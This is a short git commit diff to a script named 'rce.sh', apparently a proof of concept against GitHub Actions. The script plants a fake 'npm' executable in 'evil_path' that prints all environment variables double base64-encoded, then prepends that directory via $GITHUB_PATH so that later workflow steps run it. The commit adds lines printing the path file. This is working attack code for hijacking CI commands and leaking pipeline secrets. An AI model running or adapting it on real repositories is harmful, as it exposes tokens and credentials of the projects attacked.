16edfc1b03794e5db2c9a8f6f0ea1497c680b2d6
ritik-deriv <115521533+ritik-deriv@users.noreply.github.com>
2024-06-10 15:21:47 +0800

    Update rce.sh

--- rce.sh
+++ rce.sh
@@ -3,4 +3,6 @@ echo 'env | base64 | base64' > evil_path/npm
 
 chmod +x evil_path/npm
 echo "Github Path: $GITHUB_PATH"
+echo "Printing contents:"
+cat $GITHUB_PATH
 echo "./evil_path" > $GITHUB_PATH
